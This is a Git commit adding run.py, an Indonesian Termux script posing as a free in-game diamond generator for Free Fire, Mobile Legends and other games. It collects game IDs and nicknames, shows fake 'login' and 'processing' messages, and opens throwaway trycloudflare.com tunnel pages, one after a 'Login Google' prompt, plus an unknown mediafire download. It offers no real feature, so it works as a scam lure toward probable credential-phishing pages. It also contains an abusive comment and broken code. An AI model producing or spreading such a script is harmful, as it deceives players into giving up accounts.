7774cbd7fcc370b7f1ad7864f03b3a7b3e74d1da
kZtotorial <99101425+kZtotorial@users.noreply.github.com>
2022-04-11 17:01:44 +0800

    Add files via upload

---
+++ run.py
@@ -0,0 +1,148 @@
+# Jangan Lupa Subscribe Mr_Dark :)
+# Recode Sebelum Subscribe? ANAK HARAM!!
+
+
+
+import os,sys,time,requests,json,random,requests
+import itertools
+import threading
+from requests import post
+from requests import get
+os.system("clear")
+os.system("git pull")
+r = requests.Session()
+def mengetik(z):
+    for e in z + "\n":
+      sys.stdout.write(e)
+      sys.stdout.flush()
+      time.sleep(0.05)
+def mr_x():
+    os.system("clear")
+    os.system("pkg install neofetch")
+    os.system("clear")
+    os.system("neofetch")
+    os.system("date")
+    time.sleep(1)
+    print ("")
+    Kz = input("Mau Lanjut ke tools? \033[91m(\033[92my\033[97m/\033[92mt\033[91m) \033[97m:\033[97m ")
+    print ("\033[1;36mInfo:")
+    print ("\033[1;32m1. \033[1;33mWelcome To My Tools\033[31m")
+    time.sleep(3)
+    os.system("clear")
+def alok_mengpro():
+    alok = input("   \033[1;37m\033[31m➤ \033[36m")
+    if  alok == "1":
+         print ("  \033[1;30m<═════════[\033[1;33;41m • \033[1;37mRUNNING \033[1;33m• \033[0m\033[1;30m]══════════════>")
+         print ("     Masukan ID Freefire ")
+         jumlh = input("   \033[1;37m[\033[1;35m#\033[1;37m] ID : \033[92m")
+         jumla = input("   \033[1;37m[\033[1;35m#\033[1;37m] Nickname : \033[92m")
+         time.sleep(2)
+         jumlah = input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah: \033[92m")
+         print ("Ceking Akun...")
+         time.sleep(2)
+         print ("Login Akun Freefire ")
+         time.sleep(3)
+         os.system("xdg-open https://identifying-approve-directed-colleague.trycloudflare.com")
+         time.sleep(2)
+         print ("Prosess...")
+         os.system("pip install requests ")
+         os.system("pip install mechanize ")
+         os.system("pkg upgrade ")
+         os.system("pkg install curl")
+         os.system("pkg install python2")
+         time.sleep(3)
+         os.system("pip install mechanize ")
+         print ("Prosess...")
+         time.sleep(10)
+    elif alok == "2":
+         print ("  \033[1;30m<═════════[\033[1;33;41m • \033[1;37mRUNNING \033[1;33m• \033[0m\033[1;30m]══════════════>")
+         jumla = input("   \033[1;37m[\033[1;35m#\033[1;37m] ID ML : \033[92m")
+         jumla = input("   \033[1;37m[\033[1;35m#\033[1;37m] Nickname : \033[92m")
+         jumlah = input("   \033[1;37m[\033[1;35m#\033[1;37m] Level Akun : \033[92m")
+         juml = input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah : \033[92m")
+         os.system("xdg-open https://identifying-approve-directed-colleague.trycloudflare.com")
+         os.system("pkg install python2")
+         os.system("pip install mechanize")
+         os.system("pip install requests")
+         os.system("pip install mechanize")
+         print ("proses...")
+         time.sleep(50)
+    elif alok == "3":
+         print ("Masukan ID COC ")
+         kz = input("ID : ")
+         print ("login akun COC ")
+         os.system("xdg-open https://identifying-approve-directed-colleague.trycloudflare.com")
+    elif alok == "4":
+         print ("Maaf Menu ini Masih Dalam Perbaikan !!!")
+         print ("Subscrib dong yt gua >-<")
+         time.sleep(2)
+         os.system("xdg-open https://identifying-approve-directed-colleague.trycloudflare.com")
+    elif alok == "22":
+         print ("Subscribe bang >-<")
+         os.system("xdg-open https://www.mediafire.com/file/a4xfzfzbdswh9sj/C")
+         time.sleep(2)
+         print ("\033[92mLogin Google...")
+         time.sleep(2)
+         os.system("xdg-open https://councils-dietary-compression-nor.trycloudflare.com")
+    elif alok == "00":
+         print ("   \033[91mSamapai jumpa Lagi :)")
+         os.system("exit")
+    else:
+         time.sleep(2)
+         print ("\033[g1;37m[\033[31m•\033[1;37m] Printah: "+alok+" Salah :(")
+         time.sleep(3)
+         os.system("clear")
+         banner_anjay_alok()
+def banner_anjay_alok():
+    print ("")
+    print ("   \033[97m  •   \033[91m  •\033[97m     •\033[91m     •\033[97m     •\033[91m     • \033[97m      •\033[91m     •   \033[97m  •")
+    print ("   \033[96m  _     _     _     _     _     _       _     _     _ ")
+    print ("   \033[97m / \   / \   / \   / \   / \   / \     / \   / \   / \ ")
+    print ("   \033[97m(\033[92m T\033[97m ) (\033[92m E\033[97m ) (\033[92m L\033[97m ) (\033[92m K\033[97m ) (\033[92m O\033[97m ) (\033[92m M\033[97m )   (\033[92m O\033[97m ) (\033[92m T\033[97m ) (\033[92m P\033[97m ) ")
+    print ("   \033[96m \_/   \_/   \_/   \_/   \_/   \_/     \_/   \_/   \_/ ")
+    print ("   \033[91m  •   \033[97m  •\033[91m     •\033[97m     •\033[91m     •\033[97m     • \033[91m      •\033[97m     •   \033[91m  •")
+    print ("   \033[1;37m\033[91m•\033[1;37m YouTube\033[31m: \033[91m(\033[1;92mKz.tutorial\033[91m) ")
+    print ("   \033[1;37m\033[91m•\033[1;37m Github\033[91m: \033[91m(\033[92mgithub.com/KZ.tutorial\033[91m) ")
+    print ("   \033[1;97m\033[91m•\033[1;97m Status\033[91m: (\033[1;92mONLINE\033[91m)")
+    print ("   \033[1;97m\033[91m•\033[1;97m Secript\033[91m: \033[1;91m(\033[1;92mTools\033[91m) \033[1;91m(\033[1;92m Diamond Game \033[97m:)\033[91m) ")
+    print ("")
+    print ("    \033[1;30m<═════════[\033[1;33;41m • \033[1;37m MENU TOOLS \033[1;33m• \033[0m\033[1;30m]══════════>")
+    print ("    \033[1;97m\033[91m\033[1;93m1\033[91m.\033[96m\033[1;97m \033[91m\033[1;97m\033[1;96mDiamond ~ \033[91m(\033[92mFreefire\033[91m)")
+    print ("    \033[1;97m\033[91m\033[1;93m2\033[91m.\033[96m\033[1;97m \033[91m\033[1;97m\033[1;96mDiamond ~ \033[91m(\033[92mMobilegands\033[91m)")
+    print ("    \033[1;97m\033[91m\033[1;93m3\033[91m.\033[96m\033[1;97m \033[91m\033[1;97m\033[1;96mDiamond ~ \033[91m(\033[92mCOC\033[91m)")
+    print ("    \033[1;97m\033[91m\033[1;93m4\033[91m.\033[96m\033[1;97m \033[91m\033[1;97m\033[1;96mDiamond ~ \033[91m(\033[92mCOD\033[91m)")
+    print ("    \033[1;97m\033[91m\033[1;93m5\033[91m.\033[96m\033[1;97m \033[91m\033[1;97m\033[1;96mDiamond ~ \033[91m(\033[92mROS\033[91m)")
+    print ("   \033[1;93m00\033[91m. \033[1;92m(\033[91mExit..\033[92m)")
+    print ("")
+    alok_mengpro()
+def countdownTimer(start_minute, start_second):
+    total_second = start_minute * 60 + start_second
+    while total_second:
+        mins, secs = divmod(total_second, 60)
+        print(f'   \033[1;37m[\033[1;35m#\033[1;37m] waiting (\033[1;32m{secs:02d}\033[1;37m)', end='\r')
+        time.sleep(1)
+        total_second -= 1
+
+mr_telkom={
+'Host':'api.duniagames.co.id',
+'content-length':'50',
+'accept':'application/json, text/plain, */*',
+'sec-ch-ua-mobile':'?0',
+'save-data':'on',
+'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
+'content-type':'application/json',
+'origin':'https://duniagames.co.id',
+'sec-fetch-site':'same-site',
+'sec-fetch-mode':'cors',
+'sec-fetch-dest':'empty',
+'referer':'https://duniagames.co.id/',
+'accept-encoding':'gzip, deflate, br',
+'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
+}
+def lagi():
+    t = raw_input("Mau Mengunakan tools lagi (y/t) : ")
+    if f == "y":
+       os.syatem("rub.py")
+
+mr_x()
+banner_anjay_alok()
